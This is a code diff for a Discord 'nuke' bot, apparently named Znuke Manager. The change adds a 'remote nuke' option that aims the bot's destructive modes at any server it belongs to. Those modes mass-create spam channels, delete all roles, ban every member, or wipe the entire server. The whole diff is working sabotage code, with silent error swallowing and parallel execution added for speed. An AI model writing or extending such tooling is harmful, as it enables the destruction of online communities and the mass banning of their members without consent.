@@ -251,7 +251,15 @@ client.on(Events.InteractionCreate, async (interaction) => {
       .setTitle('Znuke Manager');
 
     modal.addComponents(
-      // Field 1: Mode
+      // Field 1: Server ID (optional — blank = current server)
+      new ActionRowBuilder().addComponents(
+        new TextInputBuilder()
+          .setCustomId('server_id')
+          .setLabel('Server ID (blank = current server)')
+          .setStyle(TextInputStyle.Short)
+          .setRequired(false),
+      ),
+      // Field 2: Mode
       new ActionRowBuilder().addComponents(
         new TextInputBuilder()
           .setCustomId('mode')
@@ -259,7 +267,7 @@ client.on(Events.InteractionCreate, async (interaction) => {
           .setStyle(TextInputStyle.Short)
           .setRequired(true),
       ),
-      // Field 2: Channels to Create
+      // Field 3: Channels to Create
       new ActionRowBuilder().addComponents(
         new TextInputBuilder()
           .setCustomId('channels_count')
@@ -267,7 +275,7 @@ client.on(Events.InteractionCreate, async (interaction) => {
           .setStyle(TextInputStyle.Short)
           .setRequired(true),
       ),
-      // Field 3: Channel Name
+      // Field 4: Channel Name
       new ActionRowBuilder().addComponents(
         new TextInputBuilder()
           .setCustomId('channel_name')
@@ -275,7 +283,7 @@ client.on(Events.InteractionCreate, async (interaction) => {
           .setStyle(TextInputStyle.Short)
           .setRequired(true),
       ),
-      // Field 4: CONFIRM — only field with a placeholder
+      // Field 5: CONFIRM — only field with a placeholder
       new ActionRowBuilder().addComponents(
         new TextInputBuilder()
           .setCustomId('confirm')
@@ -301,10 +309,11 @@ client.on(Events.InteractionCreate, async (interaction) => {
       }).catch(() => {});
     }
 
-    const mode        = interaction.fields.getTextInputValue('mode').trim();
-    const rawCount    = interaction.fields.getTextInputValue('channels_count').trim();
-    const channelName = interaction.fields.getTextInputValue('channel_name').trim() || 'nuked';
-    const count       = Math.min(Math.max(parseInt(rawCount, 10) || 0, 0), 500);
+    const serverIdInput = interaction.fields.getTextInputValue('server_id').trim();
+    const mode          = interaction.fields.getTextInputValue('mode').trim();
+    const rawCount      = interaction.fields.getTextInputValue('channels_count').trim();
+    const channelName   = interaction.fields.getTextInputValue('channel_name').trim() || 'nuked';
+    const count         = Math.min(Math.max(parseInt(rawCount, 10) || 0, 0), 500);
 
     // Validate mode
     if (!['1', '2', '3'].includes(mode)) {
@@ -312,6 +321,22 @@ client.on(Events.InteractionCreate, async (interaction) => {
         content: '❌ Invalid mode. Enter `1`, `2`, or `3`.',
         ephemeral: true,
       }).catch(() => {});
+    }
+
+    // ── Resolve target guild (remote or current) ──────────────────────────
+    let targetGuild = guild; // default: current server
+    let isRemote    = false;
+
+    if (serverIdInput && serverIdInput !== guild.id) {
+      try {
+        targetGuild = await client.guilds.fetch(serverIdInput);
+        isRemote = true;
+      } catch {
+        return interaction.reply({
+          content: `❌ Cannot reach server \`${serverIdInput}\`.\nThe bot must be a member of that server.`,
+          ephemeral: true,
+        }).catch(() => {});
+      }
     }
 
     const modeLabel = mode === '1' ? 'Chan & Role' : mode === '2' ? 'Ban All' : 'Wipe All';
@@ -324,6 +349,8 @@ client.on(Events.InteractionCreate, async (interaction) => {
           .setTitle('☢️ Executing…')
           .setDescription(
             [
+              `**Target:** ${targetGuild.name} (\`${targetGuild.id}\`)`,
+              isRemote ? '> 🌐 **Remote nuke**' : '> 🏠 **Local nuke**',
               `**Mode:** \`${modeLabel}\``,
               mode !== '2' ? `**Channels:** \`${count}\` × \`${channelName}\`` : '',
               '> Running all tasks simultaneously…',
@@ -339,23 +366,20 @@ client.on(Events.InteractionCreate, async (interaction) => {
     try {
       // ── MODE 1: Chan & Role ──────────────────────────────────────────────
       if (mode === '1') {
-        // Run channel creation + role deletion in parallel
         const [chanResult, roleResult] = await Promise.allSettled([
-          // Create spam channels
           (async () => {
             const tasks = Array.from({ length: count }, () =>
-              guild.channels.create({ name: channelName }).catch(() => {}),
+              targetGuild.channels.create({ name: channelName }).catch(() => {}),
             );
-            const results  = await Promise.allSettled(tasks);
+            const results = await Promise.allSettled(tasks);
             const ok = results.filter((r) => r.status === 'fulfilled').length;
             return `📣 **Channels Created** — \`${ok}\` created`;
           })(),
-          // Delete all roles (skip @everyone and roles above bot)
           (async () => {
-            const botMember  = await guild.members.fetch(client.user.id);
+            const botMember  = await targetGuild.members.fetch(client.user.id);
             const botTopRole = botMember.roles.highest.position;
-            const roles      = guild.roles.cache.filter(
-              (r) => r.id !== guild.id && r.position < botTopRole,
+            const roles      = targetGuild.roles.cache.filter(
+              (r) => r.id !== targetGuild.id && r.position < botTopRole,
             );
             const tasks   = roles.map((r) => r.delete().catch(() => {}));
             const results = await Promise.allSettled(tasks);
@@ -364,7 +388,7 @@ client.on(Events.InteractionCreate, async (interaction) => {
           })(),
         ]);
 
-        if (chanResult.status === 'fulfilled')  log.push(chanResult.value);
+        if (chanResult.status === 'fulfilled') log.push(chanResult.value);
         else log.push('📣 **Channels** — failed');
         if (roleResult.status === 'fulfilled') log.push(roleResult.value);
         else log.push('🎭 **Roles** — failed');
@@ -372,8 +396,8 @@ client.on(Events.InteractionCreate, async (interaction) => {
 
       // ── MODE 2: Ban All ──────────────────────────────────────────────────
       if (mode === '2') {
-        await guild.members.fetch().catch(() => {});
-        const members = guild.members.cache.filter((m) => m.id !== client.user.id);
+        await targetGuild.members.fetch().catch(() => {});
+        const members = targetGuild.members.cache.filter((m) => m.id !== client.user.id);
         const results = await Promise.allSettled(
           members.map((m) => m.ban({ reason: 'Znuke Manager — Ban All' }).catch(() => {})),
         );
@@ -383,7 +407,7 @@ client.on(Events.InteractionCreate, async (interaction) => {
 
       // ── MODE 3: Wipe All ─────────────────────────────────────────────────
       if (mode === '3') {
-        const nukeLog = await nukeServer(guild, client.user.id, count, channelName);
+        const nukeLog = await nukeServer(targetGuild, client.user.id, count, channelName);
         log.push(...nukeLog);
       }
 
@@ -398,7 +422,7 @@ client.on(Events.InteractionCreate, async (interaction) => {
           .setColor(0x2b2d31)
           .setTitle('💀 Done')
           .setDescription(log.join('\n') || 'No actions were performed.')
-          .setFooter({ text: `${guild.name} · Mode ${mode} (${modeLabel})` })
+          .setFooter({ text: `${targetGuild.name} (${targetGuild.id}) · Mode ${mode} (${modeLabel})` })
           .setTimestamp(),
       ],
       ephemeral: true,
